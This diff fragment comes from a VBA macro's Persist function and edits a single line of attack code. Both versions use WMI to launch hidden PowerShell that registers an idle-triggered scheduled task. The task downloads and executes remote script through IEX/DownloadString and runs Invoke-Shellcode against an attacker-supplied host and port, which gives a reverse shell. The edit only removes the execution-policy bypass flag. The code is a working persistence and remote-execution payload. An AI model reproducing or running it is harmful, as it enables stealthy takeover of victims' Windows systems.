@@ -363,7 +363,7 @@ Public Function Persist() As Variant
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-        objProcess.Create "Powershell.exe -WindowStyle Hidden -nop -noexit -c Invoke-Command -ScriptBlock { schtasks /create  /TN $TaskName /TR 'powershell.exe -ep Bypass -WindowStyle hidden -noexit -c ''IEX ((New-Object Net.WebClient).DownloadString(''''$global:IS_Url''''''))''; Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force' /SC onidle /i $TimeDelay}", Null, objConfig, intProcessID
+        objProcess.Create "Powershell.exe -WindowStyle Hidden -nop -noexit -c Invoke-Command -ScriptBlock { schtasks /create  /TN $TaskName /TR 'powershell.exe -WindowStyle hidden -noexit -c ''IEX ((New-Object Net.WebClient).DownloadString(''''$global:IS_Url''''''))''; Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force' /SC onidle /i $TimeDelay}", Null, objConfig, intProcessID
      End Function
 
 
